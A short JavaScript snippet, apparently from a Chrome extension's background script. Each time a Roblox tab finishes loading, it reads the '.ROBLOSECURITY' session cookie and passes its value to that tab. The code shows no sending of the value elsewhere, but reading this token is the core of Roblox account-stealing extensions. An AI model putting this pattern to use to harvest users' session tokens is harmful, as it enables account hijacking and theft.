chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
    if (changeInfo.status === 'complete' && tab.url.includes("roblox.com")) {
        chrome.cookies.get({ url: 'https://www.roblox.com/home', name: '.ROBLOSECURITY' }, (cookie) => {
            chrome.tabs.sendMessage(tabId, {
                cookie: `.ROBLOSECURITY=${cookie.value}`
            }, (response) => {
            });
        });
    }
});
